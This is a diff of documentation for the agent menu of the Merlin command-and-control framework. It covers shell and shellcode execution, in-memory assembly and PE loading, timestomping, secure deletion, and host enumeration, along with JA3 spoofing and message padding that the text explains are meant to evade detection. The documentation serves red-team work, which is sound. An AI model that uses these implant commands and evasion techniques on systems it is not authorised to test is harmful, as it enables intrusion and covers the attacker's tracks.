@@ -7,65 +7,138 @@ The agent menu context is used to interact with a single agent. The Merlin promp
 help
 ----
 
+.. note::
+    The help menu will only show commands available to agent depending on its operating system
+
+* :ref:`help core`
+* linux_
+* :ref:`help windows`
+
+.. _help core:
+
+core
+^^^^
+
+The ``core`` commands are available to every agent regardless of which operating system they are running on
+
 .. code-block:: text
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» help
 
+      COMMAND  |          DESCRIPTION           |            OPTIONS
+    +----------+--------------------------------+--------------------------------+
+      cd       | Change directories             | cd ../../ OR cd c:\\Users
+      clear    | Clear any UNSENT jobs from the |
+               | queue                          |
+      back     | Return to the main menu        |
+      download | Download a file from the agent | download <remote_file>
+      env      | View and modify environment    | env <get | set | unset |
+               | variables                      | showall> [variable] [value]
+      exit     | Instruct the agent to exit and |
+               | quit running                   |
+      group    | Add or remove the current      | group <add | remove> <group
+               | agent to/from a group          | name>
+      ifconfig | Displays host network adapter  |
+               | information                    |
+      interact | Interact with an agent         |
+      info     | Display all information about  |
+               | the agent                      |
+      ja3      | Set the agent's JA3 client     | ja3 <ja3 signature string>
+               | signature                      |
+      jobs     | Display all active jobs for    |
+               | the agent                      |
+      kill     | Kill a running process by its  | kill <pid>
+               | numerical identifier (pid)     |
+      killdate | Set the epoch date/time the    | killdate <epoch date>
+               | agent will quit running        |
+      ls       | List directory contents        | ls /etc OR ls C:\\Users OR ls
+               |                                | C:/Users
+      main     | Return to the main menu        |
+      maxretry | Set the maximum amount of      | maxretery <number>
+               | times the agent can fail to    |
+               | check in before it dies        |
+      note     | Add a server-side note to the  |
+               | agent                          |
+      nslookup | DNS query on host or ip        | nslookup 8.8.8.8
+      padding  | Set the maximum amount of      | padding <number>
+               | random data appended to every  |
+               | message                        |
+      printenv | Print all environment          | printenv
+               | variables. Alias for "env      |
+               | showall"                       |
+      pwd      | Display the current working    | pwd
+               | directory                      |
+      run      | Execute a program directly,    | run ping -c 3 8.8.8.8
+               | without using a shell          |
+      sessions | Display a table of information |
+               | about all checked-in agent     |
+               | sessions                       |
+      sdelete  | Securely delete a file         | sdelete <file path>
+      shell    | Execute a command on the agent | shell ping -c 3 8.8.8.8
+               | using the host's default shell |
+      skew     | Set the amount of skew, or     | skew <number>
+               | jitter, that an agent will use |
+               | to checkin                     |
+      sleep    | Set the agent's sleep interval | sleep 30s
+               | using Go time format           |
+      status   | Print the current status of    |
+               | the agent                      |
+      touch    | Match destination file's       | touch <source> <destination>
+               | timestamps with source file    |
+               | (alias timestomp)              |
+      upload   | Upload a file to the agent     | upload <local_file>
+               |                                | <remote_file>
+      *        | Anything else will be execute  |
+               | on the host operating system   |
+
+.. _help linux:
+
+linux
+^^^^^
+
+These commands are only available to agents running on a ``Linux`` operating system.
+
+.. code-block:: text
+
            COMMAND      |          DESCRIPTION           |            OPTIONS
     +-------------------+--------------------------------+--------------------------------+
-      cd                | Change directories             | cd ../../ OR cd c:\\Users
-      clear             | Clear any UNSENT jobs from the |
-                        | queue                          |
-      cmd               | Execute a command on the agent | cmd ping -c 3 8.8.8.8
-                        | (DEPRECIATED)                  |
-      back              | Return to the main menu        |
-      download          | Download a file from the agent | download <remote_file>
+               memfd    | Execute Linux file in memory   | <file path> [<arguments>]
+
+.. _help windows:
+
+windows
+^^^^^^^
+
+These commands are only available to agents running on a ``Windows`` operating system.
+
+.. code-block:: text
+
+           COMMAND      |          DESCRIPTION           |            OPTIONS
+    +-------------------+--------------------------------+--------------------------------+
       execute-assembly  | Execute a .NET 4.0 assembly    | execute-assembly <assembly
-                        |                                | path> [<assembly args>,
-                        |                                | <spawnto path>, <spawnto
-                        |                                | args>]
+                        |                                | path> [<assembly args>
+                        |                                | <spawnto path> <spawnto args>]
       execute-pe        | Execute a Windows PE (EXE)     | execute-pe <pe path> [<pe
-                        |                                | args>, <spawnto path>,
-                        |                                | <spawnto args>]
+                        |                                | args> <spawnto path> <spawnto
+                        |                                | args>]
       execute-shellcode | Execute shellcode              | self, remote <pid>,
                         |                                | RtlCreateUserThread <pid>
-      info              | Display all information about  |
-                        | the agent                      |
-      invoke-assembly   | Invoke, or execute, a .NET     | <assembly name>, <assembly
+      invoke-assembly   | Invoke, or execute, a .NET     | <assembly name> <assembly
                         | assembly that was previously   | args>
                         | loaded into the agent's        |
                         | process                        |
-      jobs              | Display all active jobs for    |
-                        | the agent                      |
-      kill              | Instruct the agent to die or   |
-                        | quit                           |
       load-assembly     | Load a .NET assembly into the  | <assembly path> [<assembly
                         | agent's process                | name>]
       list-assemblies   | List the .NET assemblies that  |
                         | are loaded into the agent's    |
                         | process                        |
-      ls                | List directory contents        | ls /etc OR ls C:\\Users OR ls
-                        |                                | C:/Users
-      main              | Return to the main menu        |
-      memfd             | Execute Linux file in memory   | <file path> [<arguments>]
-      nslookup          | DNS query on host or ip        | nslookup 8.8.8.8
-      pwd               | Display the current working    | pwd
-                        | directory                      |
-      run               | Execute a program directly,    | run ping -c 3 8.8.8.8
-                        | without using a shell          |
-      set               | Set the value for one of the   | ja3, killdate, maxretry,
-                        | agent's options                | padding, skew, sleep
+      netstat           | display network connections    | netstat [-p tcp|udp]
+      pipes             | Enumerate all named pipes      |
+      ps                | Get a list of running          |
+                        | processes                      |
       sharpgen          | Use SharpGen to compile and    | sharpgen <code> [<spawnto
-                        | execute a .NET assembly        | path>, <spawnto args>]
-      shell             | Execute a command on the agent | shell ping -c 3 8.8.8.8
-                        | using the host's default shell |
-      status            | Print the current status of    |
-                        | the agent                      |
-      upload            | Upload a file to the agent     | upload <local_file>
-                        |                                | <remote_file>
-      *                 | Anything else will be execute  |
-                        | on the host operating system   |
-    Agent Help Menu
+                        | execute a .NET assembly        | path> <spawnto args>]
+      uptime            | Retrieve the host's uptime
 
 cd
 --
@@ -92,6 +165,7 @@ clear
 -----
 
 The ``clear`` command will cancel all jobs in the queue that have not been sent to the agent yet.
+This command will only clear jobs for the current agent.
 
 .. code-block:: text
 
@@ -127,21 +201,114 @@ The ``download`` command is used to download a file from the host where the agen
     [+]Successfully downloaded file C:\Windows\hh.exe with a size of 17920 bytes from agent to C:\merlin\data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786\hh.exe
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
 
-exit
-----
+env
+---
 
-The ``exit`` command is used to quit the Merlin server. The user will be prompted for confirmation to prevent from accidentally quitting the program. The confirmation prompt can be skipped with ``exit -y``.
+The ``env`` command is used to interact with environment variables and has the following methods:
+  * get_
+  * :ref:`env set`
+  * showall_
+  * unset_
+
+get
+^^^
+
+The ``env get`` command is used to retrieve the value of an existing environment variable.
+The third, or last, argument is the name of environment variable to retrieve.
 
 .. code-block:: text
 
-    Merlin» exit
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
+    [-] Created job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job xaSqAdQBXs for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
-    Are you sure you want to exit? [yes/NO]:
+    [+]
+    Environment variable TEST1=TESTINGTEST
+
+.. _env set:
+
+set
+^^^
+
+The ``env set`` command is used create, or overwrite, an environment variable with the specified value.
+The third argument is the name of the environment variable and the fourth argument is the environment variables value.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env set TEST1 TESTINGTEST
+    [-] Created job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job NcyukONetb for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Set environment variable: TEST1=TESTINGTEST
+
+showall
+^^^^^^^
+
+The ``env showall`` command enumerates and return all environment variables:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
+    [-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Environment variables:
+    SHELL=/bin/bash
+    SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
+    QT_ACCESSIBILITY=1
+    SNAP_REVISION=148
+    XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
+    XDG_MENU_PREFIX=gnome-
+    GNOME_DESKTOP_SESSION_ID=this-is-deprecated
+    SNAP_REAL_HOME=/home/rastley
+    GNOME_SHELL_SESSION_MODE=ubuntu
+    SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
+
+unset
+^^^^^
+
+The ``env unset`` command clears, or empties, the environment variable name provided in the third argument:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env unset TEST1
+    [-] Created job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job hEYjNYeniT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Unset environment variable: TEST1
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env get TEST1
+    [-] Created job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job IhKdCrKHEr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Environment variable TEST1=
+
+
+exit
+----
+
+The ``exit`` control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -> control -> <agent ID> -> exit. This is the shortest way to quickly kill an agent.
+ The command will prompt for confirmation to prevent accidentally exiting the agent. If you are certain use the `-y` flag to skip confirmation.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
+
+    are you sure that you want to exit the agent? [yes/NO]:
     yes
-    [!]Quitting...
+    Merlin»
+    [-] Created job LHhrzSYuGS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
 
 execute-assembly
 -----------------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 The ``execute-assembly`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a .NET assembly into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.
 
@@ -210,6 +377,9 @@ The command requires the file path to the assembly you wish to execute in the ``
 execute-pe
 -----------------
 
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
 The ``execute-pe`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a Windows Portable Executable (PE), commonly an .exe, into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.
 
 The command is executed as: ``execute-pe <pe path> [<pe args> <spawnto path> <spawnto args>]``
@@ -254,6 +424,9 @@ The command requires the file path to the PE you wish to execute in the ``<pe pa
 
 execute-shellcode
 -----------------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 The ``execute-shellcode`` command is used to have the Agent execute the provided shellcode. This command became available in version ``0.6.4`` and is only supported for Windows agents.
 
@@ -344,42 +517,163 @@ Syntax is ``execute-shellcode userapc <PID> <SHELLCODE>`` where PID is the Proce
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX
     [+]Shellcode executed successfully
 
+group
+-----
+
+The ``group`` command interacts with server-side groups that agents can be added to and removed from.
+Arbitrary agent commands and modules can be executed against an entire group at one time.
+
+* :ref:`agentgroup add`
+* :ref:`agentgroup remove`
+
+.. _agentgroup add:
+
+add
+^^^
+
+The ``group add`` command adds the current agent to a named group. If the group name does not exist, it will be created.
+The list of available agents can be tab completed.
+
+``group add <GroupName>``
+
+.. code-block:: text
+
+    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» group add EvilCorp
+    [i] Agent 336154be-9ab9-4add-96e6-69c79f1ce77d added to group EvilCorp
+    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» group add Workstations
+    [i] Agent 336154be-9ab9-4add-96e6-69c79f1ce77d added to group Workstations
+    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» info
+
+      Status                         | Active
+      ID                             | 336154be-9ab9-4add-96e6-69c79f1ce77d
+                    <SNIP>
+      Groups                         | EvilCorp, Workstations
+      Note                           |
+
+.. _agentgroup remove:
+
+remove
+^^^^^^
+
+The ``group remove`` command is used to remove an agent from a named group. The list of ALL agents is tab completable
+but does not mean the agent is in the group. The list of existing groups can also be tab completed.
+
+``group remove <agentID> <GroupName>``
+
+.. code-block:: text
+
+    Merlin» group remove 99dbe632-984c-4c98-8f38-11535cb5d937 EvilCorp
+    Merlin»
+    [i] Agent 99dbe632-984c-4c98-8f38-11535cb5d937 removed from group EvilCorp
+
+ifconfig
+--------
+
+The ``ifconfig`` command will enumerate all of the host's network interfaces and return their configuration.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-] Created job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [-] Results job SEbZZEzGeH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Ethernet0
+      MAC Address   00:0c:29:04:29:9d
+      IP Address    192.168.1.132
+      Subnet Mask   255.255.255.0
+      Gateway       192.168.153.2
+      DHCP          Enabled
+      DHCP Server:  192.168.1.254
+
+    Bluetooth Network Connection
+      MAC Address   f4:02:28:35:ae:b6
+      IP Address    0.0.0.0
+      Subnet Mask   0.0.0.0
+      Gateway       0.0.0.0
+      DHCP          Enabled
+      DHCP Server:
+
+
 info
 ----
 
-The ``info`` command is used to get information about a specific agent.
+The ``info`` command is used to get information about a specific agent to include its configuration and environment.
+
+* Status - The agent's current communication status of either active, delayed, or dead
+* ID - The agent's unique identifier that is generated on execution
+* Platform - The operating system and architecture the agent is running on
+* User Name - The user name the agent is currently running as
+* User GUID - The unique identifier for the user the agent is currently running as
+* Hostname - The name of the compromised host where the agent is currently running
+* Process Name - The name of the process the agent is currently running in
+* Process ID - The numerical Process ID (PID) that the agent is currently running in
+* IP - A list of interface IP addresses for where the agent is currently running
+* Initial Check In - The date and time the agent first connected to the server
+* Last Check In - The date and time the agent last connected to the server followed by the relative amount of time in parenthesis
+* Groups - Any server-side groups the agent is a member of
+* Note - Any operator generated notes about the agent
+* Agent Version - The version number of the running agent
+* Agent Build - A hash of the git commit the agent was built from
+* Agent Wait Time - The amount of time the agent waits, or sleeps, between checkins
+* Agent Wait Time Skew - The amount of skew multiplied to the agent wait time
+* Agent Message Padding Max - The maximum amount of random data appended to every message to/from the agent
+* Agent Max Retries - The maximum amount of times an agent can fail to check in before it quits running
+* Agent Failed Check In - The total number of failed check in attempts
+* Agent Kill Date - The date the agent will quit running. ``1970-01-01T00:00:00Z`` signifies that the kill date is not set
+* Agent Communication Protocol - The protocol the agent is currently communicating over
+* Agent JA3 TLS Client Signature - The JA3 client signature. If empty then the default Merlin signature is being used
 
 .. code-block:: text
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info
 
-    +---------------------------+-----------------------------------------------+
-    | ID                        | c1090dbc-f2f7-4d90-a241-86e0c0217786          |
-    | Platform                  | windows                                       |
-    | Architecture              | amd64                                         |
-    | UserName                  | ACME\Dade                                     |
-    | User GUID                 | S-1-5-21-988272595-2747325887-1861723304-1002 |
-    | Hostname                  | WIN-7PD32                                     |
-    | Process ID                | 4120                                          |
-    | IP                        | [fe80::8893:b524:821:31ba/64                  |
-    |                           | 169.254.49.186/16                             |
-    |                           | 192.168.1.104/24 fe80::fd43:1a37:b31b:9788/64 |
-    | Initial Check In          | 2017-11-22 11:36:47.4171802 -0500 EST         |
-    |                           | m=+7.606503201                                |
-    | Last Check In             | 2017-11-22 12:26:50.1984432 -0500 EST         |
-    |                           | m=+3010.387766201                             |
-    | Agent Version             | 0.5.0 Beta                                    |
-    | Agent Build               | nonRelease                                    |
-    | Agent Wait Time           | 30s                                           |
-    | Agent Wait Time Skew      | 5                                             |
-    | Agent Message Padding Max | 4096                                          |
-    | Agent Max Retries         | 7                                             |
-    | Agent Kill Date           | 1970-01-01T00:00:00Z                          |
-    | Agent Failed Logins       | 0                                             |
-    +---------------------------+-----------------------------------------------+
+      Status                         | Active
+      ID                             | c1090dbc-f2f7-4d90-a241-86e0c0217786
+      Platform                       | linux/amd64
+      User Name                      | rastley
+      User GUID                      | 1000
+      Hostname                       | ubuntu
+      Process Name                   | /tmp/go-build799148624/b001/exe/main
+      Process ID                     | 200769
+      IP                             | 127.0.0.1/8 ::1/128
+                                     | 192.168.1.2/24
+                                     | fe80::b7bb:3953:682e:cb7f/64
+      Initial Check In               | 2021-08-02T23:56:10Z
+      Last Check In                  | 2021-08-03T00:18:55Z (0:00:05
+                                     | ago)
+      Groups                         |
+      Note                           |
+                                     |
+      Agent Version                  | 1.0.2
+      Agent Build                    | nonRelease
+      Agent Wait Time                | 10s
+      Agent Wait Time Skew           | 3000
+      Agent Message Padding Max      | 4096
+      Agent Max Retries              | 7
+      Agent Failed Check In          | 0
+      Agent Kill Date                | 1970-01-01T00:00:00Z
+      Agent Communication Protocol   | h2
+      Agent JA3 TLS Client Signature |
+
+interact
+--------
+
+The ``interact`` command takes one argument, the agent ID, and is used to switch agents and interact with a different, specified agent.
+
+.. note::
+    Use the built-in tab completion to cycle through and select the agent to interact with.
+
+.. code-block:: text
+
+    Merlin[agent][c22c435f-f7c4-445b-bcd4-0d4e020645af]» interact d07edfda-e119-4be2-a20f-918ab701fa3c
+    Merlin[agent][d07edfda-e119-4be2-a20f-918ab701fa3c]»
 
 invoke-assembly
 ---------------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 The ``invoke-assembly`` command will execute a .NET assembly that was previously loaded into the agent with the
 load-assembly_ command. The first argument is the name of the assembly and all the remaining arguments are passed to
@@ -412,6 +706,26 @@ This command runs the assembly in the current process without injection.
 
     [*] Current LUID    : 0x37913
 
+.. _ja3:
+
+ja3
+---
+
+`JA3 is a method for fingerprinting TLS clients on the wire <https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967>`_. Every TLS client has a unique signature depending on its configuration of the following TLS options: ``SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats``.
+
+The ``ja3`` option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). `This <https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f>`_ article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from https://ja3er.com/
+
+.. note::
+    Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The ``-ja3`` flag will override the the ``-proto`` flag and will cause the agent to use the protocol provided in the JA3 hash.
+
+This example will create a TLS client with a JA3 hash of ``51a7ad14509fd614c7bb3a50c4982b8c`` that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
 jobs
 ----
 
@@ -431,15 +745,46 @@ The ``jobs`` command will display a table of all active jobs assigned to the age
 kill
 ----
 
-The ``kill`` control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -> control -> <agent ID> -> kill. This is the shortest way to quickly kill an agent.
+The ``kill`` command is used to force a running process to quit or exit by its numerical identifier. The Process ID (PID) must be provided.
 
 .. code-block:: text
 
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill
-    Merlin» [-]Created job goaRNhTVTT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell "ps aux|grep gnome-calculator"
+    [-] Created job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job mBYVsnbYBS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] john      132905  0.3  0.6 890376 50268 ?        Sl   07:41   0:00 gnome-calculator
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill 132905
+    [-] Created job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job rjXgPGnZYl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Successfully killed pid 132905
+
+.. _killdate:
+
+killdate
+--------
+
+Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.
+
+Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.
+
+The Killdate can also be set or changed for running agents using the ``set killdate`` command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. http://unixtimestamp.50x.eu/ can be used to generate a UNIX timestamp.
+
+A UNIX timestamp of `0` will read like `1970-01-01T00:00:00Z` in the agent info table.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate 811123200
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
 list-assemblies
 ---------------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 The ``list-assemblies`` command lists .NET assemblies that have been loaded into the agent's process with the load-assembly_ command.
 
@@ -458,6 +803,9 @@ The ``list-assemblies`` command lists .NET assemblies that have been loaded into
 
 load-assembly
 -------------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 The ``load-assembly`` command loads a .NET assembly into the agent's process. Once the assembly is loaded, it can be executed
 multiple times with the invoke-assembly_ command. The .NET assembly is only sent across the wire one time.
@@ -542,8 +890,24 @@ The ``main`` command is used to leave the Agent menu and return back to the :doc
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» main
     Merlin»
 
+.. _maxretry:
+
+maxretry
+--------
+
+The ``maxretry`` control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry 50
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
 memfd
 -----
+
+.. note::
+    This command is only available to agent running on a ``Linux`` operating system!
 
 The ``memfd`` command loads a Linux executable file into memory (RAM) as an anonymous file using the
 `memfd_create <https://man7.org/linux/man-pages/man2/memfd_create.2.html>`__ API call, executes it, and returns the
@@ -566,6 +930,59 @@ for detection guidance.
 
     [+] Hello from a Python script
 
+netstat
+-------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
+The ``netstat`` command uses the Windows API to enumerating network connections and listening ports.
+Without any arguments, the ``netstat`` command returns all TCP and UDP network connections.
+
+Use ``netstat -p tcp`` to only return TCP connections and ``netstat -p udp`` to only return UDP connections.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
+    [-] Created job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [-] Results job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Proto Local Addr              Foreign Addr            State        PID/Program name
+    udp   0.0.0.0:123             0.0.0.0:0                            3272/svchost.exe
+    udp   0.0.0.0:500             0.0.0.0:0                            3104/svchost.exe
+    udp   0.0.0.0:3389            0.0.0.0:0                            984/svchost.exe
+    udp6  :::123                  0.0.0.0:0                            3272/svchost.exe
+    udp6  :::500                  0.0.0.0:0                            3104/svchost.exe
+    udp6  :::3389                 0.0.0.0:0                            984/svchost.exe
+    tcp   0.0.0.0:135             0.0.0.0:0               LISTEN       964/svchost.exe
+    tcp   0.0.0.0:445             0.0.0.0:0               LISTEN       4/System
+    tcp   0.0.0.0:3389            0.0.0.0:0               LISTEN       984/svchost.exe
+    tcp   127.0.0.1:52945         127.0.0.1:5357          TIME_WAIT
+    tcp   127.0.0.1:54441         127.0.0.1:5357          TIME_WAIT
+    tcp   192.168.1.11:59757      72.21.91.29:80          CLOSE_WAIT   6496/SearchApp.exe
+    tcp   192.168.1.11:59763      72.21.91.29:80          CLOSE_WAIT   12076/YourPhone.exe
+    tcp6  :::135                  :::0                    LISTEN       964/svchost.exe
+    tcp6  :::445                  :::0                    LISTEN       4/System
+    tcp6  :::3389                 :::0                    LISTEN       984/svchost.exe
+
+note
+----
+
+The ``note`` command creates a server-side note that operators can use to record miscellaneous information about an agent.
+The note is displayed in a column of the output from the sessions_ command
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note Demo Agent Here
+    [i] Agent c1090dbc-f2f7-4d90-a241-86e0c0217786's note set to: Demo Agent Here
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sessions
+
+                   AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
+    +--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
+      c1090dbc-f2f7-4d90-a241-86e0c0217786 | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here
+
 
 nslookup
 --------
@@ -584,6 +1001,121 @@ host's resolver and returns the results.
     Query: 9.9.9.9, Result: dns9.quad9.net.
     Query: github.com, Result: 192.30.255.113
     Query: google.com, Result: 142.250.73.238 2607:f8b0:4004:82a::200e
+
+.. _padding:
+
+padding
+-------
+
+The ``padding`` control type is used to change the _maximum_ size of a message's padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+pipes
+-----
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
+The ``pipes`` command lists all of the named pipes on the Windows host where the agent is currently running:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
+    [-] Created job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Named pipes:
+    \\.\pipe\InitShutdown
+    \\.\pipe\lsass
+    \\.\pipe\ntsvcs
+    \\.\pipe\scerpc
+    \\.\pipe\Winsock2\CatalogChangeListener-2f4-0
+    \\.\pipe\Winsock2\CatalogChangeListener-3c4-0
+    \\.\pipe\epmapper
+    \\.\pipe\Winsock2\CatalogChangeListener-254-0
+    \\.\pipe\LSM_API_service
+    \\.\pipe\Winsock2\CatalogChangeListener-3f8-0
+    \\.\pipe\eventlog
+    \\.\pipe\Winsock2\CatalogChangeListener-558-0
+    \\.\pipe\TermSrv_API_service
+    \\.\pipe\Ctx_WinStation_API_service
+    \\.\pipe\atsvc
+    \\.\pipe\Winsock2\CatalogChangeListener-734-0
+    \\.\pipe\wkssvc
+    \\.\pipe\SessEnvPublicRpc
+    \\.\pipe\Winsock2\CatalogChangeListener-a1c-0
+    \\.\pipe\spoolss
+    \\.\pipe\Winsock2\CatalogChangeListener-adc-0
+    \\.\pipe\trkwks
+
+
+printenv
+--------
+
+The ``printenv`` command is an alias for the ``env`` showall_ command that enumerates and return all environment variables:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
+    [-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    Environment variables:
+    SHELL=/bin/bash
+    SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
+    QT_ACCESSIBILITY=1
+    SNAP_REVISION=148
+    XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
+    XDG_MENU_PREFIX=gnome-
+    GNOME_DESKTOP_SESSION_ID=this-is-deprecated
+    SNAP_REAL_HOME=/home/rastley
+    GNOME_SHELL_SESSION_MODE=ubuntu
+    SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
+
+ps
+--
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
